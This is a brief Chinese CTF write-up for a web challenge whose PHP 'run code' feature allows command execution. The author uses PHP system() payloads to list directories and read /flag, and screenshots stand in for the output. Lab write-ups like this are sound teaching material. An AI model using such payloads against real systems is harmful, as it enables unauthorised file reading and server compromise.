![image-20250403181003997](./assets/image-20250403181003997.png)

右边有个run code

即命令执行

且提示为PHP工具



尝试命令执行

```
<?php system("ls");?>
```

![image-20250403181112100](./assets/image-20250403181112100.png)

左边出现回显



查看根目录

```
<?php system("ls /");?>
```

![image-20250403181138876](./assets/image-20250403181138876.png)



读取flag

```
<?php system("cat /flag");?>
```

![image-20250403181159867](./assets/image-20250403181159867.png)